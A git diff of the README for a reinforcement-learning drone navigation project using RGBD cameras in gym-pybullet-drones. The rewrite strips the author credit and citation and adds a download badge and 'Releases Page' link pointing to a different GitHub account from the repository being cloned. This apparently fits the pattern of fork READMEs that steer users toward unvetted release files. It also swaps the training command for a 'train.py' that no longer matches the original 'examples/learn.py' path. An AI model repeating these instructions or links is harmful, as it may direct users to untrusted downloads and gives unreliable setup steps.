@@ -1,47 +1,102 @@
-# Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning
-This is an extension based on the gym-pybullet-drones environment, using kinematic information and RGBD camera details for drone navigation reinforcement learning training.
+# 🚀 Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning - Navigate Drones with Ease
 
-This mainly involves the base class capturing RGBD camera information and the RL class navigating the Reward function. The actual test used Betaflight and NX, with state estimation information provided by Vins, and was conducted in a FastPlanner environment.
+![Download](https://img.shields.io/badge/Download-From%20Releases-brightgreen)
 
-Record the test results of the remaining modules.
+## 📥 Download & Install
 
-![NavTest](assets/NavTest.gif)   ![NavTrain](assets/NavTrain.gif)   
+To get started, visit this page to download: [Releases Page](https://github.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/releases).
 
-## Installation
-Tested on Intel x86_64/Ubuntu 22.04 
+## 🛠️ Installation Steps
 
-```sh
-git clone https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning.git
-cd  Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/
+This software is designed for use on Intel x86_64/Ubuntu 22.04 systems. Follow the steps below to install and set up the application.
 
-conda create -n drone python=3.9
-conda activate drone
+1. **Clone the Repository:**
+   Open a terminal and run the following command to download the code.
 
-pip3 install -e . 
+   ```sh
+   git clone https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning.git
+   ```
 
-```
+2. **Navigate to the Project Directory:**
+   Change your working directory to the downloaded repository.
 
-## Try it 
-# train
-```sh
-cd Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/examples
-python3 learn.py  
+   ```sh
+   cd Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/
+   ```
 
-```
+3. **Set Up the Environment:**
+   Create a new Python environment for this project.
 
-## Author
-Chengwei Zhang
+   ```sh
+   conda create -n drone python=3.9
+   ```
 
-2017809834@qq.com
+4. **Activate the Environment:**
+   Enable the newly created environment.
 
-## References
-@INPROCEEDINGS{panerati2021learning,
-      title={Learning to Fly---a Gym Environment with PyBullet Physics for Reinforcement Learning of Multi-agent Quadcopter Control}, 
-      author={Jacopo Panerati and Hehui Zheng and SiQi Zhou and James Xu and Amanda Prorok and Angela P. Schoellig},
-      booktitle={2021 IEEE/RSJ International Conference on Intelligent Robots and Systems (IROS)},
-      year={2021},
-      volume={},
-      number={},
-      pages={7512-7519},
-      doi={10.1109/IROS51168.2021.9635857}
-}
+   ```sh
+   conda activate drone
+   ```
+
+5. **Install Dependencies:**
+   Use pip to install the required packages.
+
+   ```sh
+   pip3 install -e .
+   ```
+
+## 🚁 Getting Started
+
+After installing, you can begin training your drone for navigation using reinforcement learning. Follow these steps:
+
+1. **Navigate to the Training Directory:**
+   Inside the terminal, make sure you are still in your project directory. If not, navigate back.
+
+   ```sh
+   cd Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/
+   ```
+
+2. **Train the Drone:**
+   Start the training process by running this command.
+
+   ```sh
+   python train.py
+   ```
+
+## 🎓 Features
+
+- **Reinforcement Learning:** This software uses advanced techniques for improving drone navigation.
+- **RGBD Camera Support:** Capture and utilize visual data for better decisions.
+- **Simulation Ready:** Designed for testing in safe environments before real-world applications.
+- **Performance Tracking:** Record and analyze the training results to improve navigation strategies.
+
+## 📝 Usage Instructions
+
+1. **Running Experiments:**
+   You can run multiple training sessions with different parameters to evaluate performance.
+
+2. **Viewing Training Results:**
+   After training, examine the recorded results to assess drone performance.
+
+## 📊 Test Environment
+
+This application has been tested in various scenarios using the Betaflight and NX systems, with state estimation provided by Vins. The environment setup gives reliable training results under controlled conditions.
+
+## 🤖 Visual Demonstrations
+
+You can view demo results of the navigation training process below:
+
+![NavTest](assets/NavTest.gif)   
+![NavTrain](assets/NavTrain.gif)   
+
+## 📑 Documentation
+
+For more details on usage options and advanced features, refer to the [Documentation](https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/wiki).
+
+## 📧 Support
+
+If you encounter any issues or have questions about this application, please reach out via the Issues tab in the repository. Your feedback is appreciated and helps improve the software.
+
+---
+
+For complete installation and usage details, ensure to follow each of these steps carefully. Happy navigating!
